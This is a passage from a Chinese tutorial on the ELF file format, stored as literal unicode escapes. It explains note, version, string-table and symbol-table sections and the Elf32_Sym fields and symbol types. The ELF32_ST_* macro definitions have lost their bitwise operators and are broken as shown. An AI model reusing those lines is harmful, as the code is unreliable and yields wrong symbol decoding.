table\uff09\u3002\n\n\n\n\n\n\n.relname\n\n\nSHT_REL\n\n\n\n\n\u8fd9\u4e9b\u8282\u533a\u4e2d\u5305\u542b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u5305\u542b\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u6bb5\u4e2d\u6709\u91cd\u5b9a\u4f4d\u5185\u5bb9\uff0c\u8282\u533a\u7684\u5c5e\u6027\u5c06\u5305\u542bSHF_ALLOC\u4f4d\uff0c\u5426\u5219\u8be5\u4f4d\u7f6e 0\u3002\u4f20\u7edf\u4e0a name \u6839\u636e\u91cd\u5b9a\u4f4d\u6240\u9002\u7528\u7684\u8282\u533a\u7ed9\u5b9a\u3002\u4f8b\u5982 .text \u8282\u533a\u7684\u91cd\u5b9a\u4f4d\u8282\u533a\u540d\u5b57\u5c06\u662f\uff1a.rel.text \u6216\u8005 .rela.text\u3002\n\n\n\n\n\n\n.relaname\n\n\nSHT_RELA\n\n\n\n\n\n\n\n\n\n\n.shstrtab\n\n\nSHT_STRTAB\n\n\n\n\n\u6b64\u8282\u533a\u5305\u542b\u8282\u533a\u540d\u79f0\u3002\n\n\n\n\n\n\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u4ee5 \u201c.\u201d \u5f00\u5934\u7684\u8282\u533a\u540d\u79f0\u662f\u7cfb\u7edf\u4fdd\u7559\u7684\uff0c\u5f53\u7136\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u8282\u533a\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u7cfb\u7edf\u8282\u533a\u51b2\u7a81\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5c3d\u91cf\u4f7f\u7528\u6ca1\u6709\u524d\u7f00\u7684\u8282\u533a\u540d\u79f0\u3002\n\n\n\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u5141\u8bb8\u5b9a\u4e49\u4e0d\u5728\u4e0a\u8ff0\u5217\u8868\u4e2d\u7684\u8282\u533a\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u540d\u5b57\u76f8\u540c\u7684\u8282\u533a\u3002\n\n\n\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u8282\u533a\u540d\u79f0\u4e00\u822c\u547d\u540d\u89c4\u5219\u4e3a\uff1a\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u540d\u79f0\u7b80\u5199+ \u8282\u533a\u540d\u79f0\u3002\u5176\u4e2d\uff0c\u5904\u7406\u5668\u540d\u79f0\u5e94\u8be5\u4e0e e_machine \u4e2d\u4f7f\u7528\u7684\u540d\u79f0\u76f8\u540c\u3002\u4f8b\u5982 .FOO.psect \u8282\u533a\u662f FOO \u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684 psect \u8282\u533a\u3002\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684\u5206\u7c7b\u5373\u6bb5\u7c7b\u578b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u540c\u65f6\u4e5f\u4f1a\u52a0\u4e0a\u81ea\u5df1\u7684\u4e00\u4e9b\u7b80\u5355\u5206\u7c7b\u3002\n\n\nNote related sections\n\n\n\u6709\u65f6\u5019\u751f\u4ea7\u5382\u5546\u6216\u8005\u7cfb\u7edf\u6784\u5efa\u8005\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u7279\u6b8a\u7684\u4fe1\u606f\u6765\u6807\u8bb0ELF\u6587\u4ef6\uff0c\u4ece\u800c\u5176\u5b83\u7a0b\u5e8f\u53ef\u4ee5\u6765\u68c0\u67e5\u8be5ELF\u6587\u4ef6\u7684\u4e00\u81f4\u6027\u4ee5\u53ca\u517c\u5bb9\u6027\u3002\u8282\u533a\u7c7b\u578b\u4e3a SHT_NOTE \u6216\u8005\u7a0b\u5e8f\u5934\u90e8\u7c7b\u578b\u4e3a PT_NOTE \u7684\u5143\u7d20\u7528\u4e8e\u6765\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u5b83\u4eec\u4e2d\u5bf9\u8c61\u7684\u8868\u9879\u53ef\u80fd\u5305\u542b\u4e00\u5230\u591a\u4e2a\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f\u76ee\u6807\u5904\u7406\u5668\u683c\u5f0f\u7684 4 \u5b57\u8282\u6570\u7ec4\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e9b\u53ef\u80fd\u7684\u6ce8\u91ca\u4fe1\u606f\u3002\u4f46\u662f\u8fd9\u5e76\u4e0d\u5728 ELF \u6587\u4ef6\u7684\u89c4\u8303\u5185\u3002\n\n\n\n\n\n\nnamesz\u4e0ename\n\n\nname\u7684\u524dnamesz\u5b57\u8282\u5305\u542b\u4e86\u4e00\u4e2a\u4ee5NULL\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u8868\u793a\u8be5\u9879\u7684\u62e5\u6709\u8005\u6216\u8005\u53d1\u8d77\u4eba\u3002\u4f46\u662f\u76ee\u524d\u5e76\u6ca1\u6709\u907f\u514d\u51b2\u7a81\u7684\u683c\u5f0f\u5316\u7684\u547d\u540d\u673a\u5236\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u751f\u4ea7\u5382\u5546\u4f1a\u4f7f\u7528\u4ed6\u4eec\u81ea\u5df1\u516c\u53f8\u7684\u540d\u5b57\uff0c\u4f8b\u5982\u201cXYZ Computer Company\u201d\u6765\u5f53\u505a\u5bf9\u5e94\u7684\u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u540d\u5b57\u7684\u8bdd\uff0cnamesz\u5e94\u8be5\u662f0\u3002\u90a3\u4e48\u5728name\u7684\u5730\u65b9\u5e94\u8be5\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002\n\n\n\n\n\n\ndescsz\u4e0edesc\n\n\ndesc\u7684\u524ddescsz\u5b57\u8282\u5305\u542b\u4e86\u6ce8\u91ca\u7684\u63cf\u8ff0\u3002ELF\u6587\u4ef6\u5bf9\u4e8e\u63cf\u8ff0\u7684\u5185\u5bb9\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u63cf\u8ff0\u7684\u8bdd\uff0cdescsz\u5e94\u8be5\u4e3a0\u3002\u5f53\u7136\uff0c\u5e94\u8be5\u5728desc\u5904\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002\n\n\n\n\n\n\ntype\n\n\n\u8fd9\u4e2a\u5b57\u6bb5\u7ed9\u51fa\u4e86\u63cf\u8ff0\u7684\u89e3\u91ca\uff0c\u5bf9\u4e8e\u4e0d\u540c\u90a3\u4e2a\u7684\u53d1\u8d77\u8005\u6765\u8bf4\uff0c\u4ed6\u4eec\u90fd\u5fc5\u987b\u63a7\u5236\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u5bf9\u4e8e\u540c\u4e00\u7c7b\u578b\u6765\u8bf4\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u63cf\u8ff0\u4e0e\u5176\u5bf9\u5e94\u3002\u56e0\u6b64\uff0c\u53d1\u8d77\u8005\u5fc5\u987b\u80fd\u591f\u8bc6\u522b\u540d\u5b57\u4ee5\u53ca\u7c7b\u578b\u4ee5\u4fbf\u4e8e\u6765\u7406\u89e3\u5bf9\u5e94\u7684\u63cf\u8ff0\u3002\u76ee\u524d\u6765\u8bf4\uff0c\u7c7b\u578b\u4e0d\u80fd\u591f\u4e3a\u975e\u8d1f\u503c\uff0cELF\u6587\u4ef6\u7684\u89c4\u8303\u91cc\u5e76\u4e0d\u5b9a\u4e49\u63cf\u8ff0\u7b26\u7684\u610f\u601d\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48type\u5728\u524d\u9762\u3002\n\n\n\n\n\n\n\n\n\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e00\u4e0b\n\n\n\n\n\u8fd9\u91cc\u5305\u542b\u4e86\u4e24\u4e2a\u8868\u9879\u3002\n\n\n\u5728 Linux \u4e2d\uff0c\u4e0e Note \u76f8\u5173\u7684\u8282\u5305\u542b\u4e86 ELF \u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u6ce8\u91ca\u4fe1\u606f\uff0c\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u8282\n\n\n\n\n.note.ABI-tag\n\n\n.note.gnu.build-id\n\n\n\n\n\u4f8b\u5b50\n\n\nversion releated sections\n\n\nELF \u6587\u4ef6\u4e0d\u4ec5\u53ef\u4ee5\u5bfc\u5165\u5916\u90e8\u7684\u7b26\u53f7\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5bfc\u5165\u6307\u5b9a\u7248\u672c\u7684\u7b26\u53f7\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u4ece GLIBC_2.2.5 \u4e2d\u5bfc\u5165\u5176\u4e2d\u7684\u4e00\u4e9b\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u6bd4\u5982 printf\u3002\u5176\u4e2d\uff0c.gnu.version_r \u4fdd\u5b58\u4e86\u7248\u672c\u7684\u5b9a\u4e49\uff0c\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u662f Elf_Verdef\u3002\n\n\n\u5982\u4e0b\n\n\n\n\n.gnu.version\uff0cVersions of symbols.\n\n\n.gnu.version_d\uff0cVersion definitions of symbols.\n\n\n.gnu.version_r\uff0cVersion references (version needs) of symbols.\n\n\n\n\n\u4f8b\u5b50\n\n\n.strtab: String Table\n\n\n\u8be5\u8282\u533a\u63cf\u8ff0\u9ed8\u8ba4\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002ELF \u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u5b58\u50a8\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u540d\uff0c\u5305\u62ec\n\n\n\n\n\u53d8\u91cf\u540d\n\n\n\u51fd\u6570\u540d\n\n\n\n\n\u8be5\u8282\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u52a0\u8f7d\u5bf9\u5e94\u7684\u5b50\u96c6 .dynstr \u8282\u3002\n\n\n\u4e00\u822c\u901a\u8fc7\u5bf9\u5b57\u7b26\u4e32\u7684\u9996\u4e2a\u5b57\u6bcd\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u4e0b\u6807\u6765\u7d22\u5f15\u5b57\u7b26\u4e32\u3002\n\n\n\u5b57\u7b26\u4e32\u8868\u7684\u9996\u5c3e\u5b57\u8282\u90fd\u662fNULL\u3002\u6b64\u5916\uff0c\u7d22\u5f15\u4e3a0\u7684\u5b57\u7b26\u4e32\u8981\u4e48\u6ca1\u6709\u540d\u5b57\uff0c\u8981\u4e48\u5c31\u662f\u540d\u5b57\u4e3a\u7a7a\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\u3002\u5b57\u7b26\u4e32\u8868\u4e5f\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u76f8\u5e94\u7684\uff0c\u5176\u8282\u533a\u5934\u90e8\u7684 sh_size \u6210\u5458\u5c06\u4e3a0\u3002\u5728\u7a7a\u5b57\u7b26\u4e32\u8868\u4e2d\u7d22\u5f15\u5927\u4e8e 0 \u7684\u4e0b\u6807\u663e\u7136\u662f\u975e\u6cd5\u7684\u3002\n\n\n\u4e00\u4e2a\u8282\u533a\u5934\u90e8\u7684 sh_name \u6210\u5458\u7684\u503c\u4e3a\u5176\u76f8\u5e94\u7684\u8282\u533a\u5934\u90e8\u5b57\u7b26\u4e32\u8868\u8282\u533a\u7684\u7d22\u5f15\uff0c\u6b64\u8282\u533a\u7531 ELF \u5934\u7684 e_shstrndx \u6210\u5458\u7ed9\u51fa\u3002\u4e0b\u56fe\u7ed9\u51fa\u4e86\u4e00\u4e2a\u5305\u542b 25 \u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u4ee5\u53ca\u4e0e\u4e0d\u540c\u7d22\u5f15\u76f8\u5173\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\n\n\n\n\u7d22\u5f15\n\n\n+0\n\n\n+1\n\n\n+2\n\n\n+3\n\n\n+4\n\n\n+5\n\n\n+6\n\n\n+7\n\n\n+8\n\n\n+9\n\n\n\n\n\n\n\n\n\n\n0\n\n\n\\0\n\n\nn\n\n\na\n\n\nm\n\n\ne\n\n\n.\n\n\n\\0\n\n\nV\n\n\na\n\n\nr\n\n\n\n\n\n\n10\n\n\ni\n\n\na\n\n\nb\n\n\nl\n\n\ne\n\n\n\\0\n\n\na\n\n\nb\n\n\nl\n\n\ne\n\n\n\n\n\n\n20\n\n\n\\0\n\n\n\\0\n\n\nx\n\n\nx\n\n\n\\0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u5176\u4e2d\u5305\u542b\u7684\u5b57\u7b26\u4e32\u6709\n\n\n\n\n\n\n\n\n\u7d22\u5f15\n\n\n\u5b57\u7b26\u4e32\n\n\n\n\n\n\n\n\n\n\n0\n\n\nnone\n\n\n\n\n\n\n1\n\n\nname.\n\n\n\n\n\n\n7\n\n\nVariable\n\n\n\n\n\n\n11\n\n\nable\n\n\n\n\n\n\n16\n\n\nable\n\n\n\n\n\n\n24\n\n\n\u7a7a\u5b57\u7b26\u4e32\n\n\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\n\n\n\n\n\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\u53ef\u4ee5\u5f15\u7528\u8282\u533a\u4e2d\u4efb\u610f\u5b57\u8282\u3002\n\n\n\u5b57\u7b26\u4e32\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\u3002\n\n\n\u53ef\u4ee5\u5b58\u5728\u5bf9\u5b50\u5b57\u7b26\u4e32\u7684\u5f15\u7528\u3002\n\n\n\u540c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u5f15\u7528\u591a\u6b21\u3002\n\n\n\u5b57\u7b26\u4e32\u8868\u4e2d\u4e5f\u53ef\u4ee5\u5b58\u5728\u672a\u5f15\u7528\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c \nstrip\n \u540e\u5c31\u4f1a\u6d88\u5931\u3002\n\n\n.shstrtab: Section Header String Table\n\n\n\u8be5\u8282\u533a\u4e0e \n.strtab\n \u7684\u5b58\u50a8\u7ed3\u6784\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u8be5\u8282\u533a\u5b58\u50a8\u7684\u662f\u8282\u533a\u540d\u7684\u5b57\u7b26\u4e32\u3002\n\n\n.symtab: Symbol Table\n\n\n\u6982\u8ff0\n\n\n\u6bcf\u4e2a\u76ee\u6807\u6587\u4ef6\u90fd\u4f1a\u6709\u4e00\u4e2a\u7b26\u53f7\u8868\uff0c\u719f\u6089\u7f16\u8bd1\u539f\u7406\u7684\u5c31\u4f1a\u77e5\u9053\uff0c\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\uff0c\u5fc5\u987b\u6709\u76f8\u5e94\u7684\u7ed3\u6784\u6765\u7ba1\u7406\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u4ee5\u4fbf\u4e8e\u5bf9\u51fd\u6570\u548c\u53d8\u91cf\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\n\n\n\u6b64\u5916\uff0c\u94fe\u63a5\u672c\u8d28\u5c31\u662f\u628a\u591a\u4e2a\u4e0d\u540c\u7684\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u201c\u7c98\u201d\u5728\u4e00\u8d77\uff0c\u5b9e\u9645\u4e0a\uff0c\u76ee\u6807\u6587\u4ef6\u76f8\u4e92\u7c98\u5408\u662f\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u5bf9\u5730\u5740\u7684\u5f15\u7528\uff0c\u5373\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5730\u5740\u7684\u76f8\u4e92\u5f15\u7528\u3002\u800c\u5728\u7c98\u5408\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7b26\u53f7\u5c31\u662f\u5176\u4e2d\u7684\u7c98\u5408\u5242\u3002\n\n\n\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7b26\u53f7\u8868\u5305\u542b\u4e86\n\u4e00\u4e9b\u901a\u7528\u7684\u7b26\u53f7\n\uff0c\u8fd9\u90e8\u5206\u4fe1\u606f\u5728\u8fdb\u884c\u4e86 \nstrip\n \u64cd\u4f5c\u540e\u5c31\u4f1a\u6d88\u5931\u3002\u5305\u62ec\n\n\n\n\n\u53d8\u91cf\u540d\n\n\n\u51fd\u6570\u540d\n\n\n\n\n\u7b26\u53f7\u8868\u5176\u5b9e\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5177\u4f53\u5982\u4e0b\n\n\ntypedef\n \nstruct\n \n{\n\n    \nElf32_Word\n      \nst_name\n;\n\n    \nElf32_Addr\n      \nst_value\n;\n\n    \nElf32_Word\n      \nst_size\n;\n\n    \nunsigned\n \nchar\n   \nst_info\n;\n\n    \nunsigned\n \nchar\n   \nst_other\n;\n\n    \nElf32_Half\n      \nst_shndx\n;\n\n\n}\n \nElf32_Sym\n;\n\n\n\n\n\n\u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5b57\u6bb5\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nst_name\n\n\n\u7b26\u53f7\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\u5982\u679c\u8be5\u503c\u975e 0\uff0c\u5219\u5b83\u8868\u793a\u4e86\u7ed9\u51fa\u7b26\u53f7\u540d\u7684\u5b57\u7b26\u4e32\u8868\u7d22\u5f15\uff0c\u5426\u5219\u7b26\u53f7\u8868\u9879\u6ca1\u6709\u540d\u79f0\u3002  \u6ce8\uff1a\u5916\u90e8  C  \u7b26\u53f7\u5728 C \u8bed\u8a00\u548c\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4e2d\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u3002\n\n\n\n\n\n\nst_value\n\n\n\u7ed9\u51fa\u4e0e\u7b26\u53f7\u76f8\u5173\u8054\u7684\u6570\u503c\uff0c\u5177\u4f53\u53d6\u503c\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6b63\u5e38\u7684\u6570\u503c\u3001\u4e00\u4e2a\u5730\u5740\u7b49\u7b49\u3002\n\n\n\n\n\n\nst_size\n\n\n\u7ed9\u51fa\u5bf9\u5e94\u7b26\u53f7\u6240\u5360\u7528\u7684\u5927\u5c0f\u3002\u5982\u679c\u7b26\u53f7\u6ca1\u6709\u5927\u5c0f\u6216\u8005\u5927\u5c0f\u672a\u77e5\uff0c\u5219\u6b64\u6210\u5458\u4e3a0\u3002\n\n\n\n\n\n\nst_info\n\n\n\u7ed9\u51fa\u7b26\u53f7\u7684\u7c7b\u578b\u548c\u7ed1\u5b9a\u5c5e\u6027\u3002\u4e4b\u540e\u4f1a\u7ed9\u51fa\u82e5\u5e72\u53d6\u503c\u548c\u542b\u4e49\u7684\u7ed1\u5b9a\u5173\u7cfb\u3002\n\n\n\n\n\n\nst_other\n\n\n\u76ee\u524d\u4e3a0\uff0c\u5176\u542b\u4e49\u6ca1\u6709\u88ab\u5b9a\u4e49\u3002\n\n\n\n\n\n\nst_shndx\n\n\n\u5982\u679c\u7b26\u53f7\u5b9a\u4e49\u5728\u8be5\u6587\u4ef6\u4e2d\uff0c\u90a3\u4e48\u8be5\u6210\u5458\u4e3a\u7b26\u53f7\u6240\u5728\u8282\u5728\u8282\u533a\u5934\u90e8\u8868\u4e2d\u7684\u4e0b\u6807\uff1b\u5982\u679c\u7b26\u53f7\u4e0d\u5728\u672c\u76ee\u6807\u6587\u4ef6\u4e2d\u56fd\uff0c\u6216\u8005\u5bf9\u4e8e\u67d0\u4e9b\u7279\u6b8a\u7684\u7b26\u53f7\uff0c\u8be5\u6210\u5458\u5177\u6709\u4e00\u4e9b\u7279\u6b8a\u542b\u4e49\u3002\n\n\n\n\n\n\n\n\n\u5176\u4e2d\uff0c\u7b26\u53f7\u8868\u4e2d\u4e0b\u6807 0 \u5b58\u50a8\u4e86\u7b26\u53f7\u8868\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u540c\u65f6\u8fd9\u4e2a\u5143\u7d20\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u7279\u6b8a\uff0c\u4f5c\u4e3a\u6240\u6709\u672a\u5b9a\u4e49\u7b26\u53f7\u7684\u7d22\u5f15\uff0c\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nst_name\n\n\n0\n\n\n\u65e0\u540d\u79f0\n\n\n\n\n\n\nst_value\n\n\n0\n\n\n0 \u503c\n\n\n\n\n\n\nst_size\n\n\n0\n\n\n\u65e0\u5927\u5c0f\n\n\n\n\n\n\nst_info\n\n\n0\n\n\n\u65e0\u7c7b\u578b\uff0c\u5c40\u90e8\u7ed1\u5b9a\n\n\n\n\n\n\nst_other\n\n\n0\n\n\n\u65e0\u9644\u52a0\u4fe1\u606f\n\n\n\n\n\n\nst_shndx\n\n\n0\n\n\n\u65e0\u8282\u533a\n\n\n\n\n\n\n\n\nst_value\n\n\n\u5728 Linux \u7684 ELF \u6587\u4ef6\u4e2d\uff0c\u5177\u4f53\u8bf4\u660e\u5982\u4e0b\n\n\n\n\n\u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u3002\u6211\u4eec\u53ef\u7531\u8fd9\u4e2a\u503c\u83b7\u53d6\u5176\u6587\u4ef6\u504f\u79fb\n\n\n\u83b7\u53d6\u8be5\u7b26\u53f7\u5bf9\u5e94\u7684 \nst_shndx\n\uff0c\u8fdb\u800c\u83b7\u53d6\u5230\u76f8\u5173\u7684\u8282\u533a\u3002\n\n\n\u6839\u636e\u8282\u533a\u5934\u5143\u7d20\u53ef\u4ee5\u83b7\u53d6\u8282\u533a\u7684\u865a\u62df\u57fa\u5730\u5740\u548c\u6587\u4ef6\u57fa\u5730\u5740\u3002\n\n\nvalue-\u5185\u5b58\u57fa\u865a\u62df\u5730\u5740=\u6587\u4ef6\u504f\u79fb-\u6587\u4ef6\u57fa\u5730\u5740\n\n\n\n\n\n\n\u8be5\u7b26\u53f7\u5bf9\u5e94\u7740\u4e00\u4e2a\u51fd\u6570\uff0c\u90a3\u4e48\u8868\u660e\u8be5\u51fd\u6570\u5728\u6587\u4ef6\u4e2d\u7684\u8d77\u59cb\u5730\u5740\u3002\n\n\n\n\nst_info\n\n\nst_info \u4e2d\u5305\u542b\u7b26\u53f7\u7c7b\u578b\u548c\u7ed1\u5b9a\u4fe1\u606f\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e86\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u5177\u4f53\u4fe1\u606f\u5982\u4e0b\n\n\n#define ELF32_ST_TYPE(i)    ((i)\n0xf)\n#define ELF32_ST_INFO(b, t) (((b)\n4) + ((t)\n0xf))\n\n\n\n\nSymbol Type\n\n\n\u53ef\u4ee5\u770b\u51fa st_info \u7684\u4f4e 4 \u4f4d\u8868\u793a\u7b26\u53f7\u7684\u7c7b\u578b\uff0c\u5177\u4f53\u5b9a\u4e49\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nSTT_NOTYPE\n\n\n0\n\n\n\u7b26\u53f7\u7684\u7c7b\u578b\u6ca1\u6709\u5b9a\u4e49\u3002\n\n\n\n\n\n\nSTT_OBJECT\n\n\n1\n\n\n\u7b26\u53f7\u4e0e\u67d0\u4e2a\u6570\u636e\u5bf9\u8c61\u76f8\u5173\uff0c\u6bd4\u5982\u4e00\u4e2a\u53d8\u91cf\u3001\u6570\u7ec4\u7b49\u7b49\u3002\n\n\n\n\n\n\nSTT_FUNC\n\n\n2\n\n\n\u7b26\u53f7\u4e0e\u67d0\u4e2a\u51fd\u6570\u6216\u8005\u5176\u4ed6\u53ef\u6267\u884c\u4ee3\u7801\u76f8\u5173\u3002\n\n\n\n\n\n\nSTT_SECTION\n\n\n3\n\n\n\u7b26\u53f7\u4e0e\u67d0\u4e2a\u8282\u533a\u76f8\u5173\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u7b26\u53f7\u8868\u9879\u4e3b\u8981\u7528\u4e8e\u91cd\u5b9a\u4f4d\uff0c\u901a\u5e38\u5177\u6709 STB_LOCAL \u7ed1\u5b9a\u3002\n\n\n\n\n\n\nSTT_FILE\n\n\n4\n\n\n\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7b26\u53f7\u7684\u540d\u79f0\u7ed9\u51fa\u4e86\u751f\u6210\u8be5\u76ee\u6807\u6587\u4ef6\u76f8\u5173\u7684\u6e90\u6587\u4ef6\u7684\u540d\u79f0\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u8be5\u7b26\u53f7\u5177\u6709 STB_LOCAL  \u7ed1\u5b9a\uff0c\u5176\u8282\u533a\u7d22\u5f15\u662f SHN_ABS \u4e14\u4f18\u5148\u7ea7\u6bd4\u5176\u4ed6\nSTB_LOCAL\n\u7b26\u53f7\u9ad8\u3002\n\n\n\n\n\n\nSTT_LOPROC\n\uff5e\nSTT_HIPROC\n\n\n13~15\n\n\n\u4fdd\u7559\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\n\n\n\n\n\n\n\n\n\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u7b26\u53f7\u6709\u6bd4\u8f83\u7279\u6b8a\uff0c\u5f53\u53e6\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5f15\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u94fe\u63a5\u5668\u81ea\u52a8\u4e3a\u88ab\u5f15\u7528\u7b26\u53f7\u521b\u5efa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u3002\u5171\u4eab\u76ee\u6807\u4e2d\u9664\u4e86\nSTT_FUNC\n \uff0c \u5176\u5b83\u7b26\u53f7\u5c06\u4e0d\u4f1a\u901a\u8fc7\u8fc7\u7a0b\u94fe\u63a5\u8868\u81ea\u52a8\u88ab\u5f15\u7528\u3002\n\n\n\u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u7684\u503c\u6307\u5411\u8282\u5185\u7684\u7279\u5b9a\u4f4d\u7f6e\uff0c\u5219\u5b83\u7684\u8282\u7d22\u5f15\u53f7 \nst_shndx\n\uff0c\u5305\u542b\u4e86\u5b83\u5728\u8282\u5934\u8868\u4e2d\u7684\u7d22\u5f15\u3002\u5f53\u4e00\u4e2a\u8282\u5728\u91cd\u5b9a\u4f4d\u8fc7\u7a0b\u4e2d\u79fb\u52a8\u65f6\uff0c\u8be5\u7b26\u53f7\u503c\u4e5f\u505a\u76f8\u5e94\u6539\u53d8\uff0c\u5bf9\u8be5\u7b26\u53f7\u7684\u5f15\u7528\u7ee7\u7eed\u6307\u5411\u7a0b\u5e8f\u4e2d\u7684\u76f8\u540c\u4f4d\u7f6e\u3002\u6709\u4e9b\u7279\u5b9a\u8282\u7d22\u5f15\u503c\u5177\u6709\u5176\u4ed6\u8bed\u4e49\u3002\n\n\nSymbol Binding\n\n\n\u6839\u636e \n#define ELF32_ST_BIND(i)    ((i)\n4)\n \u53ef\u4ee5\u770b\u51fa st_info \u7684\u9ad8 4 